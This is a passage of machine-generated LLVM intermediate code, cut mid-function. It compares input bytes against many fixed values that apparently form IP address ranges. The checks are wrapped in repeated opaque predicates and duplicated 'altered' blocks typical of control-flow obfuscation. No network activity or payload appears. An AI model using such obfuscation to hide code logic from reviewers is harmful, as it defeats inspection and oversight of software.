  %3710 = mul i32 %3707, %3709
  %3711 = urem i32 %3710, 2
  %3712 = icmp eq i32 %3711, 0
  %3713 = icmp slt i32 %3708, 10
  %3714 = or i1 %3712, %3713
  br i1 %3714, label %originalBBpart2500, label %originalBB498alteredBB

originalBBpart2500:                               ; preds = %originalBB498
  br i1 %3706, label %3715, label %3719

; <label>:3715:                                   ; preds = %originalBBpart2500
  %3716 = load i8, i8* %3, align 1
  %3717 = zext i8 %3716 to i32
  %3718 = icmp eq i32 %3717, 255
  br i1 %3718, label %5259, label %3719

; <label>:3719:                                   ; preds = %3715, %originalBBpart2500
  %3720 = load i8, i8* %2, align 1
  %3721 = zext i8 %3720 to i32
  %3722 = icmp eq i32 %3721, 5
  br i1 %3722, label %3723, label %3727

; <label>:3723:                                   ; preds = %3719
  %3724 = load i8, i8* %3, align 1
  %3725 = zext i8 %3724 to i32
  %3726 = icmp eq i32 %3725, 135
  br i1 %3726, label %5259, label %3727

; <label>:3727:                                   ; preds = %3723, %3719
  %3728 = load i8, i8* %2, align 1
  %3729 = zext i8 %3728 to i32
  %3730 = icmp eq i32 %3729, 5
  br i1 %3730, label %3731, label %3735

; <label>:3731:                                   ; preds = %3727
  %3732 = load i8, i8* %3, align 1
  %3733 = zext i8 %3732 to i32
  %3734 = icmp eq i32 %3733, 196
  br i1 %3734, label %5259, label %3735

; <label>:3735:                                   ; preds = %3731, %3727
  %3736 = load i32, i32* @x.57
  %3737 = load i32, i32* @y.58
  %3738 = sub i32 %3736, 1
  %3739 = mul i32 %3736, %3738
  %3740 = urem i32 %3739, 2
  %3741 = icmp eq i32 %3740, 0
  %3742 = icmp slt i32 %3737, 10
  %3743 = or i1 %3741, %3742
  br i1 %3743, label %originalBB502, label %originalBB502alteredBB

originalBB502:                                    ; preds = %originalBB502alteredBB, %3735
  %3744 = load i8, i8* %2, align 1
  %3745 = zext i8 %3744 to i32
  %3746 = icmp eq i32 %3745, 5
  %3747 = load i32, i32* @x.57
  %3748 = load i32, i32* @y.58
  %3749 = sub i32 %3747, 1
  %3750 = mul i32 %3747, %3749
  %3751 = urem i32 %3750, 2
  %3752 = icmp eq i32 %3751, 0
  %3753 = icmp slt i32 %3748, 10
  %3754 = or i1 %3752, %3753
  br i1 %3754, label %originalBBpart2504, label %originalBB502alteredBB

originalBBpart2504:                               ; preds = %originalBB502
  br i1 %3746, label %3755, label %3775

; <label>:3755:                                   ; preds = %originalBBpart2504
  %3756 = load i32, i32* @x.57
  %3757 = load i32, i32* @y.58
  %3758 = sub i32 %3756, 1
  %3759 = mul i32 %3756, %3758
  %3760 = urem i32 %3759, 2
  %3761 = icmp eq i32 %3760, 0
  %3762 = icmp slt i32 %3757, 10
  %3763 = or i1 %3761, %3762
  br i1 %3763, label %originalBB506, label %originalBB506alteredBB

originalBB506:                                    ; preds = %originalBB506alteredBB, %3755
  %3764 = load i8, i8* %3, align 1
  %3765 = zext i8 %3764 to i32
  %3766 = icmp eq i32 %3765, 39
  %3767 = load i32, i32* @x.57
  %3768 = load i32, i32* @y.58
  %3769 = sub i32 %3767, 1
  %3770 = mul i32 %3767, %3769
  %3771 = urem i32 %3770, 2
  %3772 = icmp eq i32 %3771, 0
  %3773 = icmp slt i32 %3768, 10
  %3774 = or i1 %3772, %3773
  br i1 %3774, label %originalBBpart2508, label %originalBB506alteredBB

originalBBpart2508:                               ; preds = %originalBB506
  br i1 %3766, label %5259, label %3775

; <label>:3775:                                   ; preds = %originalBBpart2508, %originalBBpart2504
  %3776 = load i8, i8* %2, align 1
  %3777 = zext i8 %3776 to i32
  %3778 = icmp eq i32 %3777, 91
  br i1 %3778, label %3779, label %3783

; <label>:3779:                                   ; preds = %3775
  %3780 = load i8, i8* %3, align 1
  %3781 = zext i8 %3780 to i32
  %3782 = icmp eq i32 %3781, 134
  br i1 %3782, label %5259, label %3783

; <label>:3783:                                   ; preds = %3779, %3775
  %3784 = load i32, i32* @x.57
  %3785 = load i32, i32* @y.58
  %3786 = sub i32 %3784, 1
  %3787 = mul i32 %3784, %3786
  %3788 = urem i32 %3787, 2
  %3789 = icmp eq i32 %3788, 0
  %3790 = icmp slt i32 %3785, 10
  %3791 = or i1 %3789, %3790
  br i1 %3791, label %originalBB510, label %originalBB510alteredBB

originalBB510:                                    ; preds = %originalBB510alteredBB, %3783
  %3792 = load i8, i8* %2, align 1
  %3793 = zext i8 %3792 to i32
  %3794 = icmp eq i32 %3793, 104
  %3795 = load i32, i32* @x.57
  %3796 = load i32, i32* @y.58
  %3797 = sub i32 %3795, 1
  %3798 = mul i32 %3795, %3797
  %3799 = urem i32 %3798, 2
  %3800 = icmp eq i32 %3799, 0
  %3801 = icmp slt i32 %3796, 10
  %3802 = or i1 %3800, %3801
  br i1 %3802, label %originalBBpart2512, label %originalBB510alteredBB

originalBBpart2512:                               ; preds = %originalBB510
  br i1 %3794, label %3803, label %3831

; <label>:3803:                                   ; preds = %originalBBpart2512
  %3804 = load i8, i8* %3, align 1
  %3805 = zext i8 %3804 to i32
  %3806 = icmp eq i32 %3805, 200
  br i1 %3806, label %3807, label %3831

; <label>:3807:                                   ; preds = %3803
  %3808 = load i32, i32* @x.57
  %3809 = load i32, i32* @y.58
  %3810 = sub i32 %3808, 1
  %3811 = mul i32 %3808, %3810
  %3812 = urem i32 %3811, 2
  %3813 = icmp eq i32 %3812, 0
  %3814 = icmp slt i32 %3809, 10
  %3815 = or i1 %3813, %3814
  br i1 %3815, label %originalBB514, label %originalBB514alteredBB

originalBB514:                                    ; preds = %originalBB514alteredBB, %3807
  %3816 = load i8, i8* %4, align 1
  %3817 = zext i8 %3816 to i32
  %3818 = icmp sge i32 %3817, 128
  %3819 = load i32, i32* @x.57
  %3820 = load i32, i32* @y.58
  %3821 = sub i32 %3819, 1
  %3822 = mul i32 %3819, %3821
  %3823 = urem i32 %3822, 2
  %3824 = icmp eq i32 %3823, 0
  %3825 = icmp slt i32 %3820, 10
  %3826 = or i1 %3824, %3825
  br i1 %3826, label %originalBBpart2516, label %originalBB514alteredBB

originalBBpart2516:                               ; preds = %originalBB514
  br i1 %3818, label %3827, label %3831

; <label>:3827:                                   ; preds = %originalBBpart2516
  %3828 = load i8, i8* %4, align 1
  %3829 = zext i8 %3828 to i32
  %3830 = icmp slt i32 %3829, 159
  br i1 %3830, label %5259, label %3831

; <label>:3831:                                   ; preds = %3827, %originalBBpart2516, %3803, %originalBBpart2512
  %3832 = load i8, i8* %2, align 1
  %3833 = zext i8 %3832 to i32
  %3834 = icmp eq i32 %3833, 107
  br i1 %3834, label %3835, label %3847

; <label>:3835:                                   ; preds = %3831
  %3836 = load i8, i8* %3, align 1
  %3837 = zext i8 %3836 to i32
  %3838 = icmp eq i32 %3837, 152
  br i1 %3838, label %3839, label %3847

; <label>:3839:                                   ; preds = %3835
  %3840 = load i8, i8* %4, align 1
  %3841 = zext i8 %3840 to i32
  %3842 = icmp sge i32 %3841, 96
  br i1 %3842, label %3843, label %3847

; <label>:3843:                                   ; preds = %3839
  %3844 = load i8, i8* %4, align 1
  %3845 = zext i8 %3844 to i32
  %3846 = icmp slt i32 %3845, 111
  br i1 %3846, label %5259, label %3847

; <label>:3847:                                   ; preds = %3843, %3839, %3835, %3831
  %3848 = load i32, i32* @x.57
  %3849 = load i32, i32* @y.58
  %3850 = sub i32 %3848, 1
  %3851 = mul i32 %3848, %3850
  %3852 = urem i32 %3851, 2
  %3853 = icmp eq i32 %3852, 0
  %3854 = icmp slt i32 %3849, 10
  %3855 = or i1 %3853, %3854
  br i1 %3855, label %originalBB518, label %originalBB518alteredBB

originalBB518:                                    ; preds = %originalBB518alteredBB, %3847
  %3856 = load i8, i8* %2, align 1
  %3857 = zext i8 %3856 to i32
  %3858 = icmp eq i32 %3857, 107
  %3859 = load i32, i32* @x.57
  %3860 = load i32, i32* @y.58
  %3861 = sub i32 %3859, 1
  %3862 = mul i32 %3859, %3861
  %3863 = urem i32 %3862, 2
  %3864 = icmp eq i32 %3863, 0
  %3865 = icmp slt i32 %3860, 10
  %3866 = or i1 %3864, %3865
  br i1 %3866, label %originalBBpart2520, label %originalBB518alteredBB

originalBBpart2520:                               ; preds = %originalBB518
  br i1 %3858, label %3867, label %3895

; <label>:3867:                                   ; preds = %originalBBpart2520
  %3868 = load i8, i8* %3, align 1
  %3869 = zext i8 %3868 to i32
  %3870 = icmp eq i32 %3869, 181
  br i1 %3870, label %3871, label %3895

; <label>:3871:                                   ; preds = %3867
  %3872 = load i8, i8* %4, align 1
  %3873 = zext i8 %3872 to i32
  %3874 = icmp sge i32 %3873, 160
  br i1 %3874, label %3875, label %3895

; <label>:3875:                                   ; preds = %3871
  %3876 = load i32, i32* @x.57
  %3877 = load i32, i32* @y.58
  %3878 = sub i32 %3876, 1
  %3879 = mul i32 %3876, %3878
  %3880 = urem i32 %3879, 2
  %3881 = icmp eq i32 %3880, 0
  %3882 = icmp slt i32 %3877, 10
  %3883 = or i1 %3881, %3882
  br i1 %3883, label %originalBB522, label %originalBB522alteredBB

originalBB522:                                    ; preds = %originalBB522alteredBB, %3875
  %3884 = load i8, i8* %4, align 1
  %3885 = zext i8 %3884 to i32
  %3886 = icmp slt i32 %3885, 189
  %3887 = load i32, i32* @x.57
  %3888 = load i32, i32* @y.58
  %3889 = sub i32 %3887, 1
  %3890 = mul i32 %3887, %3889
  %3891 = urem i32 %3890, 2
  %3892 = icmp eq i32 %3891, 0
  %3893 = icmp slt i32 %3888, 10
  %3894 = or i1 %3892, %3893
  br i1 %3894, label %originalBBpart2524, label %originalBB522alteredBB

originalBBpart2524:                               ; preds = %originalBB522
  br i1 %3886, label %5259, label %3895

; <label>:3895:                                   ; preds = %originalBBpart2524, %3871, %3867, %originalBBpart2520
  %3896 = load i8, i8* %2, align 1
  %3897 = zext i8 %3896 to i32
  %3898 = icmp eq i32 %3897, 172
  br i1 %3898, label %3899, label %3927

; <label>:3899:                                   ; preds = %3895
  %3900 = load i8, i8* %3, align 1
  %3901 = zext i8 %3900 to i32
  %3902 = icmp eq i32 %3901, 98
  br i1 %3902, label %3903, label %3927

; <label>:3903:                                   ; preds = %3899
  %3904 = load i32, i32* @x.57
  %3905 = load i32, i32* @y.58
  %3906 = sub i32 %3904, 1
  %3907 = mul i32 %3904, %3906
  %3908 = urem i32 %3907, 2
  %3909 = icmp eq i32 %3908, 0
  %3910 = icmp slt i32 %3905, 10
  %3911 = or i1 %3909, %3910
  br i1 %3911, label %originalBB526, label %originalBB526alteredBB

originalBB526:                                    ; preds = %originalBB526alteredBB, %3903
  %3912 = load i8, i8* %4, align 1
  %3913 = zext i8 %3912 to i32
  %3914 = icmp sge i32 %3913, 64
  %3915 = load i32, i32* @x.57
  %3916 = load i32, i32* @y.58
  %3917 = sub i32 %3915, 1
  %3918 = mul i32 %3915, %3917
  %3919 = urem i32 %3918, 2
  %3920 = icmp eq i32 %3919, 0
  %3921 = icmp slt i32 %3916, 10
  %3922 = or i1 %3920, %3921
  br i1 %3922, label %originalBBpart2528, label %originalBB526alteredBB

originalBBpart2528:                               ; preds = %originalBB526
  br i1 %3914, label %3923, label %3927

; <label>:3923:                                   ; preds = %originalBBpart2528
  %3924 = load i8, i8* %4, align 1
  %3925 = zext i8 %3924 to i32
  %3926 = icmp slt i32 %3925, 95
  br i1 %3926, label %5259, label %3927

; <label>:3927:                                   ; preds = %3923, %originalBBpart2528, %3899, %3895
  %3928 = load i8, i8* %2, align 1
  %3929 = zext i8 %3928 to i32
  %3930 = icmp eq i32 %3929, 184
  br i1 %3930, label %3931, label %3959

; <label>:3931:                                   ; preds = %3927
  %3932 = load i32, i32* @x.57
  %3933 = load i32, i32* @y.58
  %3934 = sub i32 %3932, 1
  %3935 = mul i32 %3932, %3934
  %3936 = urem i32 %3935, 2
  %3937 = icmp eq i32 %3936, 0
  %3938 = icmp slt i32 %3933, 10
  %3939 = or i1 %3937, %3938
  br i1 %3939, label %originalBB530, label %originalBB530alteredBB

originalBB530:                                    ; preds = %originalBB530alteredBB, %3931
  %3940 = load i8, i8* %3, align 1
  %3941 = zext i8 %3940 to i32
  %3942 = icmp eq i32 %3941, 170
  %3943 = load i32, i32* @x.57
  %3944 = load i32, i32* @y.58
  %3945 = sub i32 %3943, 1
  %3946 = mul i32 %3943, %3945
  %3947 = urem i32 %3946, 2
  %3948 = icmp eq i32 %3947, 0
  %3949 = icmp slt i32 %3944, 10
  %3950 = or i1 %3948, %3949
  br i1 %3950, label %originalBBpart2532, label %originalBB530alteredBB

originalBBpart2532:                               ; preds = %originalBB530
  br i1 %3942, label %3951, label %3959

; <label>:3951:                                   ; preds = %originalBBpart2532
  %3952 = load i8, i8* %4, align 1
  %3953 = zext i8 %3952 to i32
  %3954 = icmp sge i32 %3953, 240
  br i1 %3954, label %3955, label %3959

; <label>:3955:                                   ; preds = %3951
  %3956 = load i8, i8* %4, align 1
  %3957 = zext i8 %3956 to i32
  %3958 = icmp slt i32 %3957, 255
  br i1 %3958, label %5259, label %3959

; <label>:3959:                                   ; preds = %3955, %3951, %originalBBpart2532, %3927
  %3960 = load i8, i8* %2, align 1
  %3961 = zext i8 %3960 to i32
  %3962 = icmp eq i32 %3961, 192
  br i1 %3962, label %3963, label %3975

; <label>:3963:                                   ; preds = %3959
  %3964 = load i8, i8* %3, align 1
  %3965 = zext i8 %3964 to i32
  %3966 = icmp eq i32 %3965, 111
  br i1 %3966, label %3967, label %3975

; <label>:3967:                                   ; preds = %3963
  %3968 = load i8, i8* %4, align 1
  %3969 = zext i8 %3968 to i32
  %3970 = icmp sge i32 %3969, 128
  br i1 %3970, label %3971, label %3975

; <label>:3971:                                   ; preds = %3967
  %3972 = load i8, i8* %4, align 1
  %3973 = zext i8 %3972 to i32
  %3974 = icmp slt i32 %3973, 143
  br i1 %3974, label %5259, label %3975

; <label>:3975:                                   ; preds = %3971, %3967, %3963, %3959
  %3976 = load i32, i32* @x.57
  %3977 = load i32, i32* @y.58
  %3978 = sub i32 %3976, 1
  %3979 = mul i32 %3976, %3978
  %3980 = urem i32 %3979, 2
  %3981 = icmp eq i32 %3980, 0
  %3982 = icmp slt i32 %3977, 10
  %3983 = or i1 %3981, %3982
  br i1 %3983, label %originalBB534, label %originalBB534alteredBB

originalBB534:                                    ; preds = %originalBB534alteredBB, %3975
  %3984 = load i8, i8* %2, align 1
  %3985 = zext i8 %3984 to i32
  %3986 = icmp eq i32 %3985, 192
  %3987 = load i32, i32* @x.57
  %3988 = load i32, i32* @y.58
  %3989 = sub i32 %3987, 1
  %3990 = mul i32 %3987, %3989
  %3991 = urem i32 %3990, 2
  %3992 = icmp eq i32 %3991, 0
  %3993 = icmp slt i32 %3988, 10
  %3994 = or i1 %3992, %3993
  br i1 %3994, label %originalBBpart2536, label %originalBB534alteredBB

originalBBpart2536:                               ; preds = %originalBB534
  br i1 %3986, label %3995, label %4023

; <label>:3995:                                   ; preds = %originalBBpart2536
  %3996 = load i32, i32* @x.57
  %3997 = load i32, i32* @y.58
  %3998 = sub i32 %3996, 1
  %3999 = mul i32 %3996, %3998
  %4000 = urem i32 %3999, 2
  %4001 = icmp eq i32 %4000, 0
  %4002 = icmp slt i32 %3997, 10
  %4003 = or i1 %4001, %4002
  br i1 %4003, label %originalBB538, label %originalBB538alteredBB

originalBB538:                                    ; preds = %originalBB538alteredBB, %3995
  %4004 = load i8, i8* %3, align 1
  %4005 = zext i8 %4004 to i32
  %4006 = icmp eq i32 %4005, 252
  %4007 = load i32, i32* @x.57
  %4008 = load i32, i32* @y.58
  %4009 = sub i32 %4007, 1
  %4010 = mul i32 %4007, %4009
  %4011 = urem i32 %4010, 2
  %4012 = icmp eq i32 %4011, 0
  %4013 = icmp slt i32 %4008, 10
  %4014 = or i1 %4012, %4013
  br i1 %4014, label %originalBBpart2540, label %originalBB538alteredBB

originalBBpart2540:                               ; preds = %originalBB538
  br i1 %4006, label %4015, label %4023

; <label>:4015:                                   ; preds = %originalBBpart2540
  %4016 = load i8, i8* %4, align 1
  %4017 = zext i8 %4016 to i32
  %4018 = icmp sge i32 %4017, 208
  br i1 %4018, label %4019, label %4023

; <label>:4019:                                   ; preds = %4015
  %4020 = load i8, i8* %4, align 1
  %4021 = zext i8 %4020 to i32
  %4022 = icmp slt i32 %4021, 223
  br i1 %4022, label %5259, label %4023

; <label>:4023:                                   ; preds = %4019, %4015, %originalBBpart2540, %originalBBpart2536
  %4024 = load i8, i8* %2, align 1
  %4025 = zext i8 %4024 to i32
  %4026 = icmp eq i32 %4025, 192
  br i1 %4026, label %4027, label %4071

; <label>:4027:                                   ; preds = %4023
  %4028 = load i32, i32* @x.57
  %4029 = load i32, i32* @y.58
  %4030 = sub i32 %4028, 1
  %4031 = mul i32 %4028, %4030
  %4032 = urem i32 %4031, 2
  %4033 = icmp eq i32 %4032, 0
  %4034 = icmp slt i32 %4029, 10
  %4035 = or i1 %4033, %4034
  br i1 %4035, label %originalBB542, label %originalBB542alteredBB

originalBB542:                                    ; preds = %originalBB542alteredBB, %4027
  %4036 = load i8, i8* %3, align 1
  %4037 = zext i8 %4036 to i32
  %4038 = icmp eq i32 %4037, 40
  %4039 = load i32, i32* @x.57
  %4040 = load i32, i32* @y.58
  %4041 = sub i32 %4039, 1
  %4042 = mul i32 %4039, %4041
  %4043 = urem i32 %4042, 2
  %4044 = icmp eq i32 %4043, 0
  %4045 = icmp slt i32 %4040, 10
  %4046 = or i1 %4044, %4045
  br i1 %4046, label %originalBBpart2544, label %originalBB542alteredBB

originalBBpart2544:                               ; preds = %originalBB542
  br i1 %4038, label %4047, label %4071

; <label>:4047:                                   ; preds = %originalBBpart2544
  %4048 = load i8, i8* %4, align 1
  %4049 = zext i8 %4048 to i32
  %4050 = icmp sge i32 %4049, 56
  br i1 %4050, label %4051, label %4071

; <label>:4051:                                   ; preds = %4047
  %4052 = load i32, i32* @x.57
  %4053 = load i32, i32* @y.58
  %4054 = sub i32 %4052, 1
  %4055 = mul i32 %4052, %4054
  %4056 = urem i32 %4055, 2
  %4057 = icmp eq i32 %4056, 0
  %4058 = icmp slt i32 %4053, 10
  %4059 = or i1 %4057, %4058
  br i1 %4059, label %originalBB546, label %originalBB546alteredBB

originalBB546:                                    ; preds = %originalBB546alteredBB, %4051
  %4060 = load i8, i8* %4, align 1
  %4061 = zext i8 %4060 to i32
  %4062 = icmp slt i32 %4061, 59
  %4063 = load i32, i32* @x.57
  %4064 = load i32, i32* @y.58
  %4065 = sub i32 %4063, 1
  %4066 = mul i32 %4063, %4065
  %4067 = urem i32 %4066, 2
  %4068 = icmp eq i32 %4067, 0
  %4069 = icmp slt i32 %4064, 10
  %4070 = or i1 %4068, %4069
  br i1 %4070, label %originalBBpart2548, label %originalBB546alteredBB

originalBBpart2548:                               ; preds = %originalBB546
  br i1 %4062, label %5259, label %4071

; <label>:4071:                                   ; preds = %originalBBpart2548, %4047, %originalBBpart2544, %4023
  %4072 = load i32, i32* @x.57
  %4073 = load i32, i32* @y.58
  %4074 = sub i32 %4072, 1
  %4075 = mul i32 %4072, %4074
  %4076 = urem i32 %4075, 2
  %4077 = icmp eq i32 %4076, 0
  %4078 = icmp slt i32 %4073, 10
  %4079 = or i1 %4077, %4078
  br i1 %4079, label %originalBB550, label %originalBB550alteredBB

originalBB550:                                    ; preds = %originalBB550alteredBB, %4071
  %4080 = load i8, i8* %2, align 1
  %4081 = zext i8 %4080 to i32
  %4082 = icmp eq i32 %4081, 198
  %4083 = load i32, i32* @x.57
  %4084 = load i32, i32* @y.58
  %4085 = sub i32 %4083, 1
  %4086 = mul i32 %4083, %4085
  %4087 = urem i32 %4086, 2
  %4088 = icmp eq i32 %4087, 0
  %4089 = icmp slt i32 %4084, 10
  %4090 = or i1 %4088, %4089
  br i1 %4090, label %originalBBpart2552, label %originalBB550alteredBB

originalBBpart2552:                               ; preds = %originalBB550
  br i1 %4082, label %4091, label %4119

; <label>:4091:                                   ; preds = %originalBBpart2552
  %4092 = load i32, i32* @x.57
  %4093 = load i32, i32* @y.58
  %4094 = sub i32 %4092, 1
  %4095 = mul i32 %4092, %4094
  %4096 = urem i32 %4095, 2
  %4097 = icmp eq i32 %4096, 0
  %4098 = icmp slt i32 %4093, 10
  %4099 = or i1 %4097, %4098
  br i1 %4099, label %originalBB554, label %originalBB554alteredBB

originalBB554:                                    ; preds = %originalBB554alteredBB, %4091
  %4100 = load i8, i8* %3, align 1
  %4101 = zext i8 %4100 to i32
  %4102 = icmp eq i32 %4101, 8
  %4103 = load i32, i32* @x.57
  %4104 = load i32, i32* @y.58
  %4105 = sub i32 %4103, 1
  %4106 = mul i32 %4103, %4105
  %4107 = urem i32 %4106, 2
  %4108 = icmp eq i32 %4107, 0
  %4109 = icmp slt i32 %4104, 10
  %4110 = or i1 %4108, %4109
  br i1 %4110, label %originalBBpart2556, label %originalBB554alteredBB

originalBBpart2556:                               ; preds = %originalBB554
  br i1 %4102, label %4111, label %4119

; <label>:4111:                                   ; preds = %originalBBpart2556
  %4112 = load i8, i8* %4, align 1
  %4113 = zext i8 %4112 to i32
  %4114 = icmp sge i32 %4113, 81
  br i1 %4114, label %4115, label %4119

; <label>:4115:                                   ; preds = %4111
  %4116 = load i8, i8* %4, align 1
  %4117 = zext i8 %4116 to i32
  %4118 = icmp slt i32 %4117, 95
  br i1 %4118, label %5259, label %4119

; <label>:4119:                                   ; preds = %4115, %4111, %originalBBpart2556, %originalBBpart2552
  %4120 = load i8, i8* %2, align 1
  %4121 = zext i8 %4120 to i32
  %4122 = icmp eq i32 %4121, 199
  br i1 %4122, label %4123, label %4151

; <label>:4123:                                   ; preds = %4119
  %4124 = load i32, i32* @x.57
  %4125 = load i32, i32* @y.58
  %4126 = sub i32 %4124, 1
  %4127 = mul i32 %4124, %4126
  %4128 = urem i32 %4127, 2
  %4129 = icmp eq i32 %4128, 0
  %4130 = icmp slt i32 %4125, 10
  %4131 = or i1 %4129, %4130
  br i1 %4131, label %originalBB558, label %originalBB558alteredBB

originalBB558:                                    ; preds = %originalBB558alteredBB, %4123
  %4132 = load i8, i8* %3, align 1
  %4133 = zext i8 %4132 to i32
  %4134 = icmp eq i32 %4133, 116
  %4135 = load i32, i32* @x.57
  %4136 = load i32, i32* @y.58
  %4137 = sub i32 %4135, 1
  %4138 = mul i32 %4135, %4137
  %4139 = urem i32 %4138, 2
  %4140 = icmp eq i32 %4139, 0
  %4141 = icmp slt i32 %4136, 10
  %4142 = or i1 %4140, %4141
  br i1 %4142, label %originalBBpart2560, label %originalBB558alteredBB

originalBBpart2560:                               ; preds = %originalBB558
  br i1 %4134, label %4143, label %4151

; <label>:4143:                                   ; preds = %originalBBpart2560
  %4144 = load i8, i8* %4, align 1
  %4145 = zext i8 %4144 to i32
  %4146 = icmp sge i32 %4145, 112
  br i1 %4146, label %4147, label %4151

; <label>:4147:                                   ; preds = %4143
  %4148 = load i8, i8* %4, align 1
  %4149 = zext i8 %4148 to i32
  %4150 = icmp slt i32 %4149, 119
  br i1 %4150, label %5259, label %4151

; <label>:4151:                                   ; preds = %4147, %4143, %originalBBpart2560, %4119
  %4152 = load i32, i32* @x.57
  %4153 = load i32, i32* @y.58
  %4154 = sub i32 %4152, 1
  %4155 = mul i32 %4152, %4154
  %4156 = urem i32 %4155, 2
  %4157 = icmp eq i32 %4156, 0
  %4158 = icmp slt i32 %4153, 10
  %4159 = or i1 %4157, %4158
  br i1 %4159, label %originalBB562, label %originalBB562alteredBB

originalBB562:                                    ; preds = %originalBB562alteredBB, %4151
  %4160 = load i8, i8* %2, align 1
  %4161 = zext i8 %4160 to i32
  %4162 = icmp eq i32 %4161, 199
  %4163 = load i32, i32* @x.57
  %4164 = load i32, i32* @y.58
  %4165 = sub i32 %4163, 1
  %4166 = mul i32 %4163, %4165
  %4167 = urem i32 %4166, 2
  %4168 = icmp eq i32 %4167, 0
  %4169 = icmp slt i32 %4164, 10
  %4170 = or i1 %4168, %4169
  br i1 %4170, label %originalBBpart2564, label %originalBB562alteredBB

originalBBpart2564:                               ; preds = %originalBB562
  br i1 %4162, label %4171, label %4199

; <label>:4171:                                   ; preds = %originalBBpart2564
  %4172 = load i8, i8* %3, align 1
  %4173 = zext i8 %4172 to i32
  %4174 = icmp eq i32 %4173, 229
  br i1 %4174, label %4175, label %4199

; <label>:4175:                                   ; preds = %4171
  %4176 = load i32, i32* @x.57
  %4177 = load i32, i32* @y.58
  %4178 = sub i32 %4176, 1
  %4179 = mul i32 %4176, %4178
  %4180 = urem i32 %4179, 2
  %4181 = icmp eq i32 %4180, 0
  %4182 = icmp slt i32 %4177, 10
  %4183 = or i1 %4181, %4182
  br i1 %4183, label %originalBB566, label %originalBB566alteredBB

originalBB566:                                    ; preds = %originalBB566alteredBB, %4175
  %4184 = load i8, i8* %4, align 1
  %4185 = zext i8 %4184 to i32
  %4186 = icmp sge i32 %4185, 248
  %4187 = load i32, i32* @x.57
  %4188 = load i32, i32* @y.58
  %4189 = sub i32 %4187, 1
  %4190 = mul i32 %4187, %4189
  %4191 = urem i32 %4190, 2
  %4192 = icmp eq i32 %4191, 0
  %4193 = icmp slt i32 %4188, 10
  %4194 = or i1 %4192, %4193
  br i1 %4194, label %originalBBpart2568, label %originalBB566alteredBB

originalBBpart2568:                               ; preds = %originalBB566
  br i1 %4186, label %4195, label %4199

; <label>:4195:                                   ; preds = %originalBBpart2568
  %4196 = load i8, i8* %4, align 1
  %4197 = zext i8 %4196 to i32
  %4198 = icmp slt i32 %4197, 255
  br i1 %4198, label %5259, label %4199

; <label>:4199:                                   ; preds = %4195, %originalBBpart2568, %4171, %originalBBpart2564
  %4200 = load i32, i32* @x.57
  %4201 = load i32, i32* @y.58
  %4202 = sub i32 %4200, 1
  %4203 = mul i32 %4200, %4202
  %4204 = urem i32 %4203, 2
  %4205 = icmp eq i32 %4204, 0
  %4206 = icmp slt i32 %4201, 10
  %4207 = or i1 %4205, %4206
  br i1 %4207, label %originalBB570, label %originalBB570alteredBB

originalBB570:                                    ; preds = %originalBB570alteredBB, %4199
  %4208 = load i8, i8* %2, align 1
  %4209 = zext i8 %4208 to i32
  %4210 = icmp eq i32 %4209, 199
  %4211 = load i32, i32* @x.57
  %4212 = load i32, i32* @y.58
  %4213 = sub i32 %4211, 1
  %4214 = mul i32 %4211, %4213
  %4215 = urem i32 %4214, 2
  %4216 = icmp eq i32 %4215, 0
  %4217 = icmp slt i32 %4212, 10
  %4218 = or i1 %4216, %4217
  br i1 %4218, label %originalBBpart2572, label %originalBB570alteredBB

originalBBpart2572:                               ; preds = %originalBB570
  br i1 %4210, label %4219, label %4247

; <label>:4219:                                   ; preds = %originalBBpart2572
  %4220 = load i8, i8* %3, align 1
  %4221 = zext i8 %4220 to i32
  %4222 = icmp eq i32 %4221, 36
  br i1 %4222, label %4223, label %4247

; <label>:4223:                                   ; preds = %4219
  %4224 = load i32, i32* @x.57
  %4225 = load i32, i32* @y.58
  %4226 = sub i32 %4224, 1
  %4227 = mul i32 %4224, %4226
  %4228 = urem i32 %4227, 2
  %4229 = icmp eq i32 %4228, 0
  %4230 = icmp slt i32 %4225, 10
  %4231 = or i1 %4229, %4230
  br i1 %4231, label %originalBB574, label %originalBB574alteredBB

originalBB574:                                    ; preds = %originalBB574alteredBB, %4223
  %4232 = load i8, i8* %4, align 1
  %4233 = zext i8 %4232 to i32
  %4234 = icmp sge i32 %4233, 220
  %4235 = load i32, i32* @x.57
  %4236 = load i32, i32* @y.58
  %4237 = sub i32 %4235, 1
  %4238 = mul i32 %4235, %4237
  %4239 = urem i32 %4238, 2
  %4240 = icmp eq i32 %4239, 0
  %4241 = icmp slt i32 %4236, 10
  %4242 = or i1 %4240, %4241
  br i1 %4242, label %originalBBpart2576, label %originalBB574alteredBB

originalBBpart2576:                               ; preds = %originalBB574
  br i1 %4234, label %4243, label %4247

; <label>:4243:                                   ; preds = %originalBBpart2576
  %4244 = load i8, i8* %4, align 1
  %4245 = zext i8 %4244 to i32
  %4246 = icmp slt i32 %4245, 223
  br i1 %4246, label %5259, label %4247

; <label>:4247:                                   ; preds = %4243, %originalBBpart2576, %4219, %originalBBpart2572
  %4248 = load i32, i32* @x.57
  %4249 = load i32, i32* @y.58
  %4250 = sub i32 %4248, 1
  %4251 = mul i32 %4248, %4250
  %4252 = urem i32 %4251, 2
  %4253 = icmp eq i32 %4252, 0
  %4254 = icmp slt i32 %4249, 10
  %4255 = or i1 %4253, %4254
  br i1 %4255, label %originalBB578, label %originalBB578alteredBB

originalBB578:                                    ; preds = %originalBB578alteredBB, %4247
  %4256 = load i8, i8* %2, align 1
  %4257 = zext i8 %4256 to i32
  %4258 = icmp eq i32 %4257, 199
  %4259 = load i32, i32* @x.57
  %4260 = load i32, i32* @y.58
  %4261 = sub i32 %4259, 1
  %4262 = mul i32 %4259, %4261
  %4263 = urem i32 %4262, 2
  %4264 = icmp eq i32 %4263, 0
  %4265 = icmp slt i32 %4260, 10
  %4266 = or i1 %4264, %4265
  br i1 %4266, label %originalBBpart2580, label %originalBB578alteredBB

originalBBpart2580:                               ; preds = %originalBB578
  br i1 %4258, label %4267, label %4295

; <label>:4267:                                   ; preds = %originalBBpart2580
  %4268 = load i8, i8* %3, align 1
  %4269 = zext i8 %4268 to i32
  %4270 = icmp eq i32 %4269, 58
  br i1 %4270, label %4271, label %4295

; <label>:4271:                                   ; preds = %4267
  %4272 = load i8, i8* %4, align 1
  %4273 = zext i8 %4272 to i32
  %4274 = icmp sge i32 %4273, 184
  br i1 %4274, label %4275, label %4295

; <label>:4275:                                   ; preds = %4271
  %4276 = load i32, i32* @x.57
  %4277 = load i32, i32* @y.58
  %4278 = sub i32 %4276, 1
  %4279 = mul i32 %4276, %4278
  %4280 = urem i32 %4279, 2
  %4281 = icmp eq i32 %4280, 0
